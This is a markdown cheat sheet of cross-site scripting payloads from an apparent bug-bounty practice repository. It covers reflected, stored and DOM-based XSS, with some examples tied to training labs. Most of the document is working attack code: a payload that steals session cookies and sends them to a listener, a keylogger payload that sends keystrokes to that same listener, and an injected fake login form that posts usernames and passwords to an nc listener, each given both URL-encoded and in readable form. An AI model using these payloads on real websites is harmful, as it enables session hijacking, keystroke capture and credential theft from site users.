# basic payload

### reflected:
```
<h1>xss try</h1>
<script>alert(1)</script>
<script>alert(document.cookie)</script>
```
### stored :
```
<img src="does-not-exist" onerror="alert(document.cookie)">

“>img src=x onerror=alert(1)
````
### DOM :
1) document.write :
```
"><svg onload=alert(1)>
" onload = "alert(document.cookies)
```
![image](https://github.com/user-attachments/assets/5b231551-8a4f-4300-a7e5-25cb89105e48)


2) innerHTML :
```
<img src="does-not-exist" onerror="alert(document.cookie)">
```

![image](https://github.com/user-attachments/assets/50dbf402-56d7-447d-a27c-d401301192f1)


3) jQuery anchor href :

after the path

```javascript:alert(document.cookie)```

and click backlink


   ![image](https://github.com/user-attachments/assets/c9b00d4c-ea24-4c01-aadb-3471141427c4)


4) jQuery hash

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
 
![image](https://github.com/user-attachments/assets/5ecb8438-f297-448b-a102-bdf5d2a60bde)

# XSS attack 1: Hijacking the user’s session
## Evil server 
```bash
node evil-server.js
```
download the zip file and use the command on terminal

[evil-server.js](https://github.com/fahimalshihab/Bug-Bounty/blob/main/XSS/Practice/evil-server-js.zip)

![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/0b07c731-cb75-4082-9e43-660816c685ea)

### Or 
can make local listener
```
nc -l localhost 5000
```
![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/3fb1b3e8-bae1-4e26-a49f-98d83509b151)


## Document.cookie
  ``` js
  <img src="does-not-exist" onerror="alert(document.cookie)">
  ```
  ``` %3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert(document.cookie)%22%3E```


## steal the session cookie
```js
    <img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?data=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">

```
``` %3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%27img%27)%3B%20img.src%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fcookie%3Fdata%3D%27%20%2B%20document.cookie%3B%20document.querySelector(%27body%27).appendChild(img)%3B%22%3E```

* Here's the JavaScript code from the last example in a readable form:
```js
var img = document.createElement('img');
img.src = 'http://localhost:3001/cookie?data=' + document.cookie;
document.querySelector('body').appendChild(img);
```


## key-logger:
```js
<img src="does-not-exist" onerror="var timeout; var buffer = \'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function(event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); timeout = setTimeout(function() { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });">
```

```
%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20timeout%3B%20var%20buffer%20%3D%20%27%27%3B%20document.querySelector(%27body%27).addEventListener(%27keypress%27%2C%20function(event)%20%7B%20if%20(event.which%20!%3D%3D%200)%20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%20%3D%20setTimeout(function()%20%7B%20var%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D%27%20%2B%20encodeURIComponent(buffer)%3B%20xhr.open(%27GET%27%2C%20uri)%3B%20xhr.send()%3B%20buffer%20%3D%20%27%27%3B%20%7D%2C%20400)%3B%20%7D%20%7D)%3B%22%3E
```

* Here's the JavaScript code from the last example in a readable form:
```js
var timeout;
var buffer = '';
document.querySelector('body').addEventListener('keypress', function(event) {
	if (event.which !== 0) {
		clearTimeout(timeout);
		buffer += String.fromCharCode(event.which);
		timeout = setTimeout(function() {
			var xhr = new XMLHttpRequest();
			var uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer);
			xhr.open('GET', uri);
			xhr.send();
			buffer = '';
		}, 400);
	}
});
```

# XSS attack 2: Phishing to steal user credentials
Lets create a local listener server 
```
nc -l localhost 5000
```
![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/cf256d77-3c2a-4522-a1de-c2d37eb464c8)


```
<h3>Please login to proceed</h3> <form action=http://localhost:5000>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```
![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/d494c8e2-cbd3-4ee7-832f-bf696f55b105)

yeahooo here we go 

![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/08c8d04d-9c05-403e-bb9a-b77724e1eae1)


